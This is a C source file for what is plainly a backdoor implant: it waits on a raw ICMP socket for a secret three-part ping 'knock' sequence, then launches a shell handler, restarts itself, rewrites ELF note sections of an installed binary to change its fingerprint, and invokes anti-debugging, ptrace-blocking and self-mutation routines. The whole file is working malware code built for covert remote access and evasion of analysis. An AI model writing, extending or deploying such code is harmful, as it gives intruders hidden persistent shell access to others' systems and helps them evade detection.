#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h> 
#include <errno.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include "icmp_common.h"

#define PORT_TO_KNOCK 12345
#define EXPECTED_SEQUENCE_SIZE 3
#define BUFSIZE 1024

extern int perform_action();     
extern void anti_debug();        
extern void check_tracer_pid(void);
extern void block_ptrace_attaches(void);
extern void install_seccomp_ptrace_kill(void);
extern int mutate_main(int argc, char **argv);

//struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);

const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};

const char *resolve_self_path(const char *argv0) {
    if (argv0 && argv0[0] == '/') {
        struct stat st;
        if (stat(argv0, &st) == 0) {
            return argv0;
        }
    }
    return "/proc/self/exe";
}

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void patch_note_section(FILE *f) {
    Elf64_Ehdr ehdr;
    fread(&ehdr, 1, sizeof(ehdr), f);
    fseek(f, ehdr.e_shoff, SEEK_SET);

    Elf64_Shdr shdr;
    char shstrtab[4096] = {0};

    fseek(f, ehdr.e_shoff + ehdr.e_shentsize * ehdr.e_shstrndx, SEEK_SET);
    fread(&shdr, 1, sizeof(shdr), f);
    fseek(f, shdr.sh_offset, SEEK_SET);
    fread(shstrtab, 1, sizeof(shstrtab) - 1, f);

    for (int i = 0; i < ehdr.e_shnum; ++i) {
        fseek(f, ehdr.e_shoff + i * ehdr.e_shentsize, SEEK_SET);
        fread(&shdr, 1, sizeof(shdr), f);
        const char *name = &shstrtab[shdr.sh_name];
        if (strcmp(name, ".note.ABI-tag") == 0 || strcmp(name, ".comment") == 0) {
            fseek(f, shdr.sh_offset, SEEK_SET);
            char junk[] = "RANDOMIZED-SECTION\0";
            fwrite(junk, 1, sizeof(junk) - 1, f);
            break;
        }
    }
}

int main(int argc, char **argv) {
    (void)argc;
    int sock;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t len;
    char buffer[BUFSIZE];
    int sequenceIndex = 0;
    
    anti_debug();

    const char *self_path = resolve_self_path(argv[0]);

    FILE *f = fopen("/usr/bin/hoxha", "r+b");
    if (f) {
        patch_note_section(f);
        fclose(f);
    }

    // Create raw socket for ICMP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) error("socket");

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
        error("bind");

    printf("Listening for ICMP knocks...\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = sizeof(cliaddr);

        ssize_t n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0,
                             (struct sockaddr *)&cliaddr, &len);
        if (n < 0) error("recvfrom");

        // Extract ICMP payload (skip IP header + ICMP header)
        struct iphdr *ip_header = (struct iphdr *)buffer;
        int ip_header_len = ip_header->ihl * 4;

        if (n < (ssize_t)(ip_header_len + sizeof(struct icmp_header))) {
            continue; // Not a complete ICMP packet
        }

        struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);

        // Only process echo requests (ICMP_ECHO)
        if (icmp_hdr->type != ICMP_ECHO) {
            continue;
        }

        char *payload = (char *)(icmp_hdr + 1);
        int payload_len = n - ip_header_len - sizeof(struct icmp_header);

        if (payload_len > 0) {
            payload[payload_len] = '\0';
            printf("Received knock: %s\n", payload);

            if (strcmp(payload, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
                sequenceIndex++;
                if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
                    printf("[*] Correct sequence received. Executing shell handler…\n");
                    perform_action(); // this may block
                    printf("[*] Shell client disconnected. Restarting self…\n");
                    close(sock);

                    char *newargv[] = { (char *)self_path, NULL };
                    execv(self_path, newargv);

                    perror("execv");
                    exit(EXIT_FAILURE);
                }
            } else {
                sequenceIndex = 0;
            }
        }

        int fake_argc = 1;
        char *fake_argv[] = { "program_name", NULL };
        mutate_main(fake_argc, fake_argv);
    }

    close(sock);
    return 0;
}
